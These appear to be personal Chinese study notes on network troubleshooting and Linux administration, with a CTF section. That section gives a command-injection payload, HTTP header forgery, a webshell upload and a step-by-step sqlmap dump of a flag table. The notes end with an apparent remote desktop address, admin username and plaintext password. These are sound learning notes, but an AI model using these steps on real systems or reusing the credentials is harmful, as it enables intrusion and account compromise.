# network_linux_vm_ctf

<a name="3060-1621846615933"></a><a name="5oq2-1704929857122"></a>[网络访问](#ufyh-1701975693298)

<a name="9tmr-1704929857124"></a>[trp网络策略](#kpfy-1702330971738)

<a name="qcbp-1704929857126"></a>[能ping 通，不能telnet通端口号](#jhls-1702330971739)

<a name="8b6t-1704929857128"></a>[.服务防火墙没开端口号](#qpds-1617231979072)

<a name="ad7i-1704929857130"></a>[.网络策略](#jc3y-1617232022491)

<a name="viy9-1704929857132"></a>[linux](#fht2-1703360837169)

<a name="zokz-1704929857134"></a>[虚拟机配置联网 ](#zgxw-1703360837718)

<a name="2yzp-1704929857136"></a>[Shell](#npyj-1703360837719)

<a name="xwmj-1704929857138"></a>[vim](#zcos-1703360837720)

<a name="cgbc-1704929857140"></a>[yum](#qwtt-1703360837721)

<a name="scqw-1704929857142"></a>[chmod赋予执行权限 ](#uvgb-1616920687083)

<a name="wxcr-1704929857144"></a>[find查找文件](#i6dd-1616728903351)

<a name="w03g-1704929857146"></a>[wget 下载快](#ajdu-1617034903995)

<a name="c0rh-1704929857148"></a>[curl 模拟http请求](#qgjy-1617483747046)

<a name="pcl3-1704929857150"></a>[防火墙设置](#cslb-1703360974878)

<a name="8ebv-1704929857152"></a>[tail监控日志](#lszu-1617560097811)

<a name="hkvh-1704929857155"></a>[连接windows远程电脑](#4ub1-1703360837722)



<a name="ufyh-1701975693298"></a>**网络访问**

<a name="kpfy-1702330971738"></a>**trp网络策略**

<a name="bvxp-1616479580046"></a>1.不能ping通，验证地址是否还维护，维护则开通网络策略（走工单最慢，平均需一周）记得去登录各个服务器去ping 接口服务器地址验证

<a name="acqi-1616479614814"></a>2.测试环境（内网）访问公网资源，访问公网的apache做代理。

<a name="vfnv-1616479681744"></a>3.生产环境是直接访问生产环境的（可能需要配置IP白名单）

<a name="v9v3-1617231944028"></a><a name="jhls-1702330971739"></a>**能ping 通，不能telnet通端口号**

<a name="qpds-1617231979072"></a>**.服务防火墙没开端口号**

<a name="jc3y-1617232022491"></a>**.网络策略**

<a name="ifdu-1616481264279"></a><a name="jxhi-1616481264414"></a>TRP内测访问测试内网地址

<a name="3vce-1616481285584"></a>UAT访问生产环境的UAT内网地址

<a name="mvxa-1703360837031"></a><a name="tdqh-1706552511139"></a>**CTF**

<a name="iadi-1706552519889"></a>**1.  ping 注入**

小明写了一个ping指令，但是没写WAF  -ping注入

<a name="o0af-1706552572481"></a>127.0.0.1 | find / -name flag.txt

<a name="mfj5-1706552563570"></a>**2. burp suit**

<a name="ejne-1706555844449"></a>**.禁止重定向**

<a name="vhgv-1706555818735"></a>**.HTTP伪造**

burp suit伪造host

X-Forwarded-For:123.123.123

<a name="rai0-1706554953119"></a>Referer:www.google.com

<a name="ns2g-1706555837745"></a>**.抓包（packet capture）**

<a name="yjgv-1711038686456"></a>intercept is on 抓取请求报文修改(js校验后进行截取-越过js校验)

<a name="25ml-1711038863007"></a>抓包（packet capture）就是将网络传输发送与接收的数据包进行截获、重发、编辑、转存等操作，也用来检查网络安全。抓包也经常被用来进行数据截取等。

<a name="mdus-1711038672286"></a>**3.GitHack**

<a name="cv6e-1718090818234"></a>根据.git获得源码

<a name="cfex-1725028078313"></a>**4. PHP 源码审核**

<a name="wwg5-1725028101129"></a>根据源码逆向出flag

<a name="81bt-1725028090449"></a>**5. webshell后门**

<a name="tbag-1734298172265"></a>upload1

<a name="lsax-1734303795677"></a>上传一句话木马文件，获取webshell后门访问系统。

<a name="tzwc-1734802761298"></a>webshell指恶意后门程序或代码注入，获得网站的远程控制。webshell核心就是危险函数，即系统命令执行函数和代码执行函数。

<a name="2pew-1734808259139"></a>**6. sqlmap注入**

<a name="7his-1734979128225"></a>NewsCenter

<a name="yykk-1734808287412"></a>需要准备python环境

<a name="dqyn-1734808270634"></a>sqlmap -u <http://192.168.100.161:53459> --data "search=df"

<a name="g5hv-1711038672430"></a>**shift 右键打开powershell （wsl linux, win版docker安装了wsl**

1\.获取注入点

python3 sqlmap.py -u http://61.147.171.105:49258/ --data "search=df"

python开始sql数据库扫描注入。

2\.获取数据库信息

python3 sqlmap.py  -u http://61.147.171.105:49258/ --data "search=df" -dbs

3\.获取库内表信息

python3 sqlmap.py  -u http://61.147.171.105:49258/ --data "search=df" -D news --tables

4\.获取表内字段信息

python3 sqlmap.py  -u http://61.147.171.105:49258/ --data "search=df" -D news -T secret\_table --columns

5\.获取字段内容，得到flag

<a name="yzrt-1734980076029"></a>python3 sqlmap.py  -u http://61.147.171.105:49258/ --data "search=df" -D news -T secret\_table -C "fl4g" --dump

<a name="bdk0-1734980060011"></a><a name="mco4-1734808320318"></a>**linux**

<a name="fxpk-1734894646025"></a>**Ubuntu 和 centos**

<a name="9g7o-1734894642992"></a>CentOS更倾向于企业级服务器应用，稳定性较强；而Ubuntu更注重用户体验，适合桌面环境以及个人用户。

<a name="xbqo-1734894400203"></a>**windows下wsl**

|<a name="xsre-1735614896996"></a>特性|<a name="offn-1735614896999"></a>wsl1|<a name="41ep-1735614897002"></a>wsl2|<a name="o3tt-1735614897005"></a>传统虚拟机（如 VirtualBox）|
| :- | :- | :- | :- |
|<a name="euin-1735614897009"></a>虚拟化级别|<a name="n7gg-1735614897012"></a>进程虚拟机|<a name="vuur-1735614897015"></a>轻量级虚拟机 + 进程虚拟机|<a name="w7gx-1735614897018"></a>硬件级虚拟机（系统虚拟机）|
|<a name="f0g4-1735614897022"></a>系统调用支持|<a name="mrbd-1735614897025"></a>系统调用翻译层|<a name="dhis-1735614897028"></a>原生 Linux 内核|<a name="rh8x-1735614897031"></a>原生 Linux 内核|
|<a name="1bmk-1735614897035"></a>启动速度|<a name="zroj-1735614897038"></a>快速启动（秒级）|<a name="rggk-1735614897041"></a>快速启动（秒级）|<a name="rrem-1735614897044"></a>慢（通常需要数十秒）|
|<a name="kv5u-1735614897048"></a>启动速度|<a name="9qgw-1735614897051"></a>较低|<a name="ghjt-1735614897054"></a>较低|<a name="315s-1735614897057"></a>高|
|<a name="ca6h-1735614897061"></a>隔离程度|<a name="57bd-1735614897064"></a>低，与宿主系统共享资源|<a name="txo3-1735614897067"></a>中，与宿主系统共享部分资源|<a name="adan-1735614897070"></a>高|

WSL  windows subsystem for linux - 中间层，将linux翻译成底层windows,可以理解为类似VM吧（的确是）

缺点，兼容性，小问题很多

powershell 下 wsl 启动

docker依赖wsl

C:\Users\18877>wsl -l -v

\* docker-desktop         Running         2

`  `docker-desktop-data    Stopped         2

`  `Ubuntu                 Running         2    

`  `--sudo半天，denny no permission 各项文件状态正常,原来是没启动，但是又可以进入命令行，真是狗了

<a name="nrmh-1734894417272"></a>启动Ubuntu： wsl -d Ubuntu ,  退出root/wsl: exit 

<a name="zgxw-1703360837718"></a>**虚拟机配置联网** 

1\.网络连接模式改为桥接

2\.$dhclient    分配有效的ip地址

3\.查找并修改网络配置文件

sudo find -type f -name '\*'|xargs grep '=192.168.1.66' 2>/dev/null     // 2>dev/null ---没有权限的不显示   sudo ---root权限

TYPE=Ethernet

PROXY\_METHOD=none

BROWSER\_ONLY=no

BOOTPROTO=static

DEFROUTE=yes

IPV4\_FAILURE\_FATAL=no

IPV6INIT=yes

IPV6\_AUTOCONF=yes

IPV6\_DEFROUTE=yes

IPV6\_FAILURE\_FATAL=no

IPV6\_ADDR\_GEN\_MODE=stable-privacy

NAME=ens33

UUID=3ea2e72f-1f5e-48ec-8d85-efe7db6dcde1

DEVICE=ens33

ONBOOT=yes

IPADDR=192.168.1.66

NETMASK=255.255.255.0

GATEWAY=192.168.1.1

DNS=119.29.29.29

重启生效

<a name="gdsb-1703360846876"></a>systemctl restart network.service



<a name="c1aj-1616514968007"></a><a name="1sw6-1616513954494"></a><a name="cgye-1616512265340"></a><a name="npyj-1703360837719"></a>**Shell**

<a name="zcos-1703360837720"></a>**vim**

<a name="6542-1585488424135"></a>新建有内容文件 vim log.txt

<a name="ylbt-1616514039767"></a>i   ---insert

<a name="m9xi-1616514048381"></a>esc : wq  保存退出

<a name="pug8-1617233806730"></a>查找 命令模式下，输入/user    下一个 n  上一个 shit+n   

<a name="qwtt-1703360837721"></a>**yum**

<a name="7htt-1616920770256"></a>Yum（全称为 Yellow dog Updater,  Modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。[ ](true)

<a name="uvgb-1616920687083"></a>**chmod赋予执行权限** 

<a name="71kn-1703360893134"></a>chmod +x /usr/java/jdk1.8/bin/java

<a name="sxjn-1616603145255"></a>tar -zxvf /root/jdk-8u161-linux-x64.tar.gz -C ./user/local/java

<a name="i6dd-1616728903351"></a>**find查找文件**

<a name="gjwn-1616728908344"></a>find ./ -type f -regex ".\*\.xml\|.\*\.html.\*\|.\*\.properties.\|.\*\.json.\*\|.\*\.xsl.\*\|.\*\.sql.\*\|.\*\.java.\*\|.\*\.js" | xargs perl -pi -e"s/\@travelsky\.com/\@travelsky.com.cn/g"

<a name="rg1s-1616728908631"></a>未覆盖到 properties  find ./ -type f -regex ".\*\.properties" | xargs perl -pi -e"s/\@travelsky\.com/\@travelsky.com.cn/g"

<a name="vew3-1617034903848"></a><a name="ajdu-1617034903995"></a>**wget 下载快**

<a name="qgjy-1617483747046"></a>**curl 模拟http请求**

<a name="cslb-1703360974878"></a>**防火墙设置**

<a name="ihxj-1617483730280"></a>**firewall-cmd --zone=public --add-port=80/tcp --permanent**

<a name="rad9-1617483739453"></a>重启防火墙：systemctl restart firewalld.service

<a name="lszu-1617560097811"></a>**tail监控日志**

<a name="dhcz-1617560098122"></a>tail -f -10 log.file  监控tomcat日志文件10行

<a name="chir-1616920691461"></a><a name="pycr-1704930186067"></a>**Cat**

<a name="4ub1-1703360837722"></a>**连接windows远程电脑**

<a name="d8pn-1616745233841"></a>win+R mstc 

<a name="go33-1616745517483"></a>172.29.33.94:11111

<a name="3792-1585489414502"></a>administrator

<a name="jesk-1616745541911"></a>zhinanzhen123



